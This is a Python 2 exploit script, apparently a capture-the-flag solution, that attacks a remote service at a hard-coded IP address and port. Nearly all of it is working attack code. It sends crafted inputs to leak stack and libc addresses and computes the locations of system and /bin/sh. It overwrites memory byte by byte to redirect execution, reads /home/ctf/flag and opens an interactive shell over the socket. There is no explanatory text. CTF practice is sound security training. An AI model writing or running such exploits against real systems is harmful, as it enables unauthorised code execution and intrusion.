import struct
from socket import *
import telnetlib
import time
import binascii

ip = "140.113.209.24"
port = 10002
soc = socket(AF_INET,SOCK_STREAM)
soc.connect((ip,port))
raw_input("wait")
payload = ""

for i in range(6):
	payload += "2"+"\x00"*20+"1"+"\x00"*20
for i in range(20):
	payload += "2"+"\x00"*20+"2"+"\x00"*20
payload += "5" + "\x00"*20 + "y" + "\x00"*20
soc.send(payload)
time.sleep(0.4)
recvbuff=soc.recv(4096)
print recvbuff

payload = ""
for i in range(28):
	payload += "3"+"\x00"*20+"1"+"\x00"*20
soc.send(payload)
time.sleep(2)
recvbuff=soc.recv(4096)
print recvbuff

payload = "3" + "\x00"*20 + "1\x00" + "\x70\xb0\x04\x08" + "\x00"*15
soc.send(payload)
time.sleep(1)
recvbuff=soc.recv(4096)
print recvbuff
address=recvbuff[recvbuff.find(':')+1:recvbuff.find(':')+5]
ebp_address=struct.unpack('<I',address)[0]+92
print hex(ebp_address)

payload = ""
payload = "3" + "\x00"*20 + "1\x00" + "\x34\xb0\x04\x08" + "\x00"*15
soc.send(payload)
time.sleep(0.4)
recvbuff=soc.recv(4096)
print recvbuff
address=recvbuff[recvbuff.find(':')+1:recvbuff.find(':')+5]

memset_address=struct.unpack('<I',address)[0]
system_address=memset_address-0x3C6D0+0x62ED0
binsh_address=memset_address+0xE41C4+0x62ED0

print hex(memset_address)
print hex(system_address)
print hex(binsh_address)
print binascii.unhexlify("%x" % (( binsh_address >> 24 )% 256))

payload = "3" + "\x00"*20 + "1\x00" + binascii.unhexlify("%08x" % ( binsh_address))[::-1] + "\x00"*15
soc.send(payload)
time.sleep(1)
recvbuff=soc.recv(4096)
print recvbuff

payload = ""
payload += "3" + "\x00"*20 + "1\x00" + "\00"*8 + binascii.unhexlify("%02x" % (( system_address  )% 256)) + "\xb1\x04\x08" + binascii.unhexlify("%08x" % ((ebp_address)))[::-1] +"\x00"*3
payload += "3" + "\x00"*20 + "1\x00" + "\00"*8 + binascii.unhexlify("%02x" % (( system_address >> 8 )% 256)) + "\xb1\x04\x08" + binascii.unhexlify("%08x" % ((ebp_address+1)))[::-1] +"\x00"*3
payload += "3" + "\x00"*20 + "1\x00" + "\00"*8 + binascii.unhexlify("%02x" % (( system_address >> 16 )% 256)) + "\xb1\x04\x08" + binascii.unhexlify("%08x" % ((ebp_address+2)))[::-1] +"\x00"*3
payload += "3" + "\x00"*20 + "1\x00" + "\00"*8 + binascii.unhexlify("%02x" % (( system_address >> 24 )% 256)) + "\xb1\x04\x08" + binascii.unhexlify("%08x" % ((ebp_address+3)))[::-1] +"\x00"*3
payload += "3" + "\x00"*20 + "1\x00" + "\00"*8 + binascii.unhexlify("%02x" % (( binsh_address  )% 256)) + "\xb1\x04\x08" + binascii.unhexlify("%08x" % ((ebp_address+8)))[::-1] +"\x00"*3
payload += "3" + "\x00"*20 + "1\x00" + "\00"*8 + binascii.unhexlify("%02x" % (( binsh_address >> 8 )% 256)) + "\xb1\x04\x08" + binascii.unhexlify("%08x" % ((ebp_address+9)))[::-1] +"\x00"*3
payload += "3" + "\x00"*20 + "1\x00" + "\00"*8 + binascii.unhexlify("%02x" % (( binsh_address >> 16 )% 256)) + "\xb1\x04\x08" + binascii.unhexlify("%08x" % ((ebp_address+10)))[::-1] +"\x00"*3
payload += "3" + "\x00"*20 + "1\x00" + "\00"*8 + binascii.unhexlify("%02x" % (( binsh_address >> 24 )% 256)) + "\xb1\x04\x08" + binascii.unhexlify("%08x" % ((ebp_address+11)))[::-1] +"\x00"*3
payload += "6" + "\x00"*20 
payload += "cat /home/ctf/flag\n"
soc.send(payload)
time.sleep(2)
recvbuff=soc.recv(4096)
print recvbuff

t = telnetlib.Telnet()
t.sock = soc
t.interact()

